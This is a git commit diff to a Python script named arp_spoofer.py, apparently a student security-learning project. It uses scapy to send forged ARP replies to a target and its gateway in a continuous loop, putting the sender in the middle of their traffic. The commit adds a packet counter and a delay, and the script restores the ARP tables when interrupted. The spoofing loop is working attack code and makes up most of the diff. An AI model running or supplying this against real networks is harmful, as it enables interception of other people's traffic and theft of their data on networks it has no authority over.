92b34fda4f1957d8b246b5b83249a65c011605d8
Noman Nasir Minhas <SP17-BSE-010@ISBSTUDENT.COMSATS.EDU.PK>
2023-01-02 01:09:43 +0500

    Counter added

--- arp_spoofer.py
+++ arp_spoofer.py
@@ -1,3 +1,5 @@
+import time
+
 import scapy.all as scapy
 import argparse
 
@@ -25,20 +27,25 @@ def get_mac(ip):
 def spoof_arp_table(victim_ip, false_requester_ip):
     target_arp_packet = scapy.ARP(op=2, pdst=victim_ip, hwdst=get_mac(victim_ip),
                                   psrc=false_requester_ip)  # OP = 2 ARP response, 1 = ARP request,
-    scapy.send(target_arp_packet, timeout=1, verbose=False)[0]  # To modify ARP table of victim
+    scapy.send(target_arp_packet, verbose=False)  # To modify ARP table of victim
 
 
 def restore_arp_table(victim_ip, false_requester_ip):
     target_arp_packet = scapy.ARP(op=2, pdst=victim_ip, hwdst=get_mac(victim_ip),
                                   psrc=false_requester_ip, hwsrc=get_mac(false_requester_ip))
-    scapy.send(target_arp_packet, timeout=1, verbose=False)[0]  # To modify ARP table of victim
+    scapy.send(target_arp_packet, verbose=False)  # To modify ARP table of victim
 
 
 option = get_arguments()
+count = 0
 try:
     while True:
         spoof_arp_table(option.target_ip, option.gateway_ip)
         spoof_arp_table(option.gateway_ip, option.target_ip)
+        count += 2
+        print("\r[+] Packets sent: " + str(count), end="")
+        time.sleep(1)
+
 except KeyboardInterrupt:
     print("[+] Detected CTRL + C ...... Resetting ARP Tables ...... Please wait.")
     restore_arp_table(option.target_ip, option.gateway_ip)
